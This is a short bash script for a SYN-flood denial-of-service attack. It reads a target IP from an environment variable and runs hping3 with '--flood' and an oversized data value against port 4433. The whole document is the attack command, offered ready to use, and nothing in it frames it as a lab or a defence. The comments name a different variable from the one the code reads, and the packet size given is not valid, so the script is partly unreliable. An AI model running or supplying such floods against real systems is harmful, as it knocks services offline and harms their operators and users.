#!/bin/bash

# Check if the DDOS_SERVER environment variable is defined
if [ -z "$ddosserver" ]; then
  echo "An IP address was not provided for the server. Make sure to set the ddosserver environment variable. Run export ddosserver=¨ip¨"
  exit 1
fi

# Use the DDOS_SERVER environment variable as the attack server's address
sudo hping3 -c 200 -d 200000000 -S "$ddosserver" -p 4433 --flood
